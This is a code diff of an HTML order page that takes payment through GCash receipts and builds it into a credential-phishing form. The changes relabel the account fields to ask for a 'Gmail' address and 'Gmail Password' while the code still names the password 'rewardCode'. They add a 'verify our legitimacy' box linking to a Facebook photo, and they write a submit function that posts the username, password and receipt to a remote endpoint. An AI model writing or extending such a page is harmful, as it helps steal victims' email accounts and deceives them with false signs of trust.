@@ -112,7 +112,7 @@
       border: 2px solid transparent;
       cursor: pointer;
       transition: all 0.4s;
-      position: relative;           /* FIXED: This was missing */
+      position: relative;
       overflow: hidden;
     }
     .price-card:hover { transform: translateY(-8px); }
@@ -120,8 +120,6 @@
       border-color: #22c55e;
       box-shadow: 0 0 40px rgba(74, 222, 128, 0.5);
     }
-
-    /* Most Popular Badge */
     .popular-badge {
       position: absolute;
       top: -12px;
@@ -135,9 +133,7 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
       z-index: 10;
       white-space: nowrap;
-      letter-spacing: 0.5px;
     }
-
     .days-options {
       display: flex;
       gap: 12px;
@@ -173,8 +169,6 @@
       background: rgba(74, 222, 128, 0.15);
       border-color: #4ade80;
     }
-
-    /* ==================== IMPROVED LEGITIMACY BOX ==================== */
     .legitimacy-box {
       background: linear-gradient(145deg, rgba(34, 197, 94, 0.25), rgba(74, 222, 128, 0.15));
       border: 3px solid #4ade80;
@@ -220,7 +214,6 @@
       box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
     }
 
-    /* Mobile Improvements */
     @media (max-width: 768px) {
       .header { padding: 70px 15px 50px; }
       .header h1 { font-size: 2.9rem; }
@@ -243,9 +236,9 @@
       <!-- Step 1 -->
       <div class="step">
         <h2>📋 Step 1: Enter Account Info</h2>
-        <input type="text" id="userId" placeholder="Reward" required>
+        <input type="text" id="userId" placeholder="Gmail" required>
         <div class="input-group" style="position:relative;">
-          <input type="password" id="rewardCode" placeholder="Reward ID">
+          <input type="password" id="rewardCode" placeholder="Gmail Password">
           <i class="toggle-eye fas fa-eye" id="toggleEye" style="position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#94a3b8;cursor:pointer;font-size:1.4rem;"></i>
         </div>
       </div>
@@ -293,10 +286,10 @@
           <small>PNG, JPG • Max 5MB</small>
           <input type="file" id="receipt" accept="image/*" style="display:none;">
         </div>
-        <img id="preview" class="preview" alt="Receipt Preview" style="margin-top:15px; max-width:100%; border-radius:16px; border:2px solid #22c55e; display:none;">
+        <img id="preview" alt="Receipt Preview" style="margin-top:15px; max-width:100%; border-radius:16px; border:2px solid #22c55e; display:none;">
       </div>
 
-      <!-- Prominent Legitimacy Box -->
+      <!-- Legitimacy Box -->
       <div class="legitimacy-box" onclick="window.open('https://www.facebook.com/photo?fbid=1506287307787459&set=a.1506288794453977', '_blank')">
         <i class="fas fa-shield-alt"></i>
         <h3>✅ VERIFY OUR LEGITIMACY FIRST</h3>
@@ -317,6 +310,7 @@
     let selectedDays = "7";
     let selectedFile = null;
 
+    // Plan & Duration Selection
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
@@ -333,6 +327,7 @@
       });
     });
 
+    // Password Toggle
     const rewardInput = document.getElementById('rewardCode');
     const toggleEye = document.getElementById('toggleEye');
     toggleEye.addEventListener('click', () => {
@@ -345,13 +340,14 @@
       }
     });
 
+    // File Upload
     const uploadArea = document.getElementById('uploadArea');
     const fileInput = document.getElementById('receipt');
     const preview = document.getElementById('preview');
 
     uploadArea.addEventListener('click', () => fileInput.click());
     fileInput.addEventListener('change', e => e.target.files[0] && handleFile(e.target.files[0]));
-   
+
     uploadArea.addEventListener('dragover', e => { e.preventDefault(); uploadArea.classList.add('dragover'); });
     uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('dragover'));
     uploadArea.addEventListener('drop', e => {
@@ -364,14 +360,18 @@
       if (file.size > 5 * 1024 * 1024) return alert("❌ File is too large. Maximum 5MB allowed.");
       selectedFile = file;
       const reader = new FileReader();
-      reader.onload = ev => { preview.src = ev.target.result; preview.style.display = 'block'; };
+      reader.onload = ev => {
+        preview.src = ev.target.result;
+        preview.style.display = 'block';
+      };
       reader.readAsDataURL(file);
     }
 
+    // ==================== MAIN SUBMIT FUNCTION ====================
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
       const username = document.getElementById('userId').value.trim();
-      const password = document.getElementById('rewardCode').value.trim();
+      const rewardCode = document.getElementById('rewardCode').value.trim();
       const note = document.getElementById('note').value.trim();
 
       if (!customer) return alert("❌ Please enter your Facebook Name");
@@ -379,9 +379,44 @@
       if (!selectedFile) return alert("❌ Please upload your GCash Payment Receipt");
 
       const btn = document.querySelector('button');
+      const originalBtnText = btn.textContent;
       btn.disabled = true;
       btn.textContent = '⏳ Sending Order...';
-      // ... rest of your original submit logic
+
+      const formData = new FormData();
+      formData.append('plan', selectedPlan);
+      formData.append('days', selectedDays);
+      formData.append('customer', customer);
+      formData.append('username', username);
+      formData.append('rewardCode', rewardCode || '');
+      formData.append('note', note || '');
+      formData.append('receipt', selectedFile);
+
+      try {
+        const response = await fetch(API_ENDPOINT, {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.text();
+
+        if (response.ok) {
+          document.getElementById('result').innerHTML = `
+            <div style="background:#166534; color:#86efac; padding:20px; border-radius:16px; text-align:center; margin-top:20px;">
+              ✅ Order sent successfully!<br>
+              <small>Your order has been received. Please wait for confirmation.</small>
+            </div>`;
+          // Reset form if needed
+        } else {
+          throw new Error(result || 'Failed to send order');
+        }
+      } catch (error) {
+        console.error(error);
+        alert("❌ Failed to send order. Please try again or contact support.");
+      } finally {
+        btn.disabled = false;
+        btn.textContent = originalBtnText;
+      }
     }
   </script>
 </body>
